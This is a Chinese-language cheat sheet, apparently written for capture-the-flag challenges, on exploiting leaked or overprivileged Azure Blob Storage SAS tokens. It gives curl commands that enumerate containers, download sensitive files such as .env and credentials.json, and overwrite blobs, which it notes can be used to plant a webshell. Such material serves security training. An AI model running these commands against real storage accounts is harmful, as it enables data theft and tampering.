# Azure Storage SAS 利用

> 适用：题目描述含 Azure / Blob Storage / SAS / Shared Access Signature / 共享访问签名 / 存储账户。

## 1. SAS 识别

SAS（Shared Access Signature）通常以完整 URL 形式泄露：

```text
https://<account>.blob.core.windows.net/<container>/<blob>?sv=2021-06-08&ss=b&srt=o&sp=r&se=2026-12-31T00:00:00Z&sig=<base64url>
```

或单独给出查询串：`sv=...&ss=...&srt=...&sp=...&se=...&sig=...`

## 2. 权限字段解析（关键：overprivileged 判据）

| 字段 | 含义 | 高危取值 |
|---|---|---|
| `sp` | 权限 | `w`(写) `d`(删) `c`(创建) `a`(添加) 表示可写 |
| `srt` | 资源范围 | `c`(container) `s`(service) 表示可枚举/遍历 |
| `ss` | 服务 | `b`(blob) `f`(file) `q`(queue) `t`(table) |
| `se` | 过期时间 | 未过期即可用 |
| `sip` | 允许 IP | 无此字段 = 任意 IP 可用 |

**"Overprivileged" 的典型特征**：`sp` 含写权限，或 `srt=c` 且 `sp` 含 `l`（list），可遍历整个容器拿到敏感文件。

## 3. 利用步骤（先读后写，按权限推进）

```bash
ACCOUNT="<account>"
CONTAINER="<container>"
SAS="<完整查询串，含 sv...sig>"

# 3.1 列出容器内所有 blob（需要 sp 含 l 且 srt 是 c 或 s）
curl -s "https://$ACCOUNT.blob.core.windows.net/$CONTAINER?restype=container&comp=list&$SAS"

# 3.2 逐个下载（需要 sp 含 r；先 list 拿文件名）
curl -s "https://$ACCOUNT.blob.core.windows.net/$CONTAINER/<blob>?$SAS" -o <blob>

# 3.3 直接读可疑文件（flag、config、.env、backup 等）
for f in flag.txt flag .env config.json credentials.json backup.zip; do
  echo "=== $f ==="
  curl -s "https://$ACCOUNT.blob.core.windows.net/$CONTAINER/$f?$SAS"
done

# 3.4 写/覆盖（需要 sp 含 w 或 c；可用于写 webshell 或覆盖校验文件）
curl -s -X PUT "https://$ACCOUNT.blob.core.windows.net/$CONTAINER/<name>?$SAS" \
  -H "x-ms-blob-type: BlockBlob" \
  -H "Content-Length: $(echo -n 'payload' | wc -c)" \
  --data-binary 'payload'
```

## 4. 常见泄露点

- 前端 JS bundle 里硬编码的 SAS URL
- 图片/资源链接里带 `?sv=...&sig=...`
- 题目描述给出的"共享链接"
- `.env` / 配置文件里的连接串

## 5. 判据与坑

| 现象 | 含义 | 对策 |
|---|---|---|
| list 返回 `AuthorizationPermissionMismatch` | `srt` 不含 container/service | 只能猜文件名，或换写/读已知路径 |
| 下载返回 403 | `sp` 无 r 或 SAS 已过期 | 检查 `se`，换其他泄露的 SAS |
| `sp` 含 `w` 但 PUT 403 | 缺 `srt=o` 对象级写 | 尝试覆盖已知存在的 blob |
| SAS 带 `sip` | 限定了来源 IP | 若目标是容器内网则无法直接使用 |
